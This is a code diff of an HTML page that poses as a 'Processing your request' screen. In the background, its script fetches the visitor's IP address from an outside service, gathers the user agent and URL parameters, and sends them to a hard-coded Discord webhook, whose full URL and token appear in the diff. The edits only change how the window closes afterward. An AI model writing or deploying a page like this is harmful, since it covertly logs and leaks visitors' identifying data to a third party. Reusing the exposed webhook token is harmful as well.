@@ -35,12 +35,12 @@
   <div class="container">
     <div class="loading"></div>
     <h2>Processing your request...</h2>
-    <p>This window will close automatically.</p>
+    <p id="status-message">This window will close automatically.</p>
   </div>
 
   <script>
     function sendWebhook() {
-      const WEBHOOK_URL = 'https://discord.com/api/webhooks/1376371981582340106/hWmxpYudjYJISHjWzAOM5tUY2xEEX1rSSdbJSCEAGyLYsKCvv1vmpfd3GVMuL0vOdCoE'; // ここに実際のWebhook URLを入れてください
+      const WEBHOOK_URL = 'https://discord.com/api/webhooks/1376371981582340106/hWmxpYudjYJISHjWzAOM5tUY2xEEX1rSSdbJSCEAGyLYsKCvv1vmpfd3GVMuL0vOdCoE';
       
       // URLパラメータから情報を取得
       const urlParams = new URLSearchParams(window.location.search);
@@ -48,6 +48,9 @@
       const datetime = urlParams.get('datetime') || '2025-05-26 04:11:15';
       const user = urlParams.get('user') || 'n4n45h1ip';
       const userAgent = urlParams.get('ua') || navigator.userAgent;
+      
+      // Check if there are URL parameters
+      const hasParams = window.location.search.length > 0;
       
       // IPアドレスを取得（外部サービス使用）
       fetch('https://api.ipify.org?format=json')
@@ -129,8 +132,21 @@
           console.error('Error:', error);
         })
         .finally(() => {
-          // 3秒後にウィンドウを閉じる
-          setTimeout(() => window.close(), 1000);
+          // Try to close the window
+          try {
+            window.close();
+          } catch (e) {
+            console.log("Could not close window automatically");
+          }
+          
+          // If window didn't close (likely because of URL parameters), 
+          // update the message and provide alternative
+          setTimeout(() => {
+            const statusMessage = document.getElementById('status-message');
+            if (statusMessage && document.visibilityState !== 'hidden') {
+              statusMessage.innerHTML = 'Processing complete. You may close this window now.';
+            }
+          }, 1200);
         });
     }
     
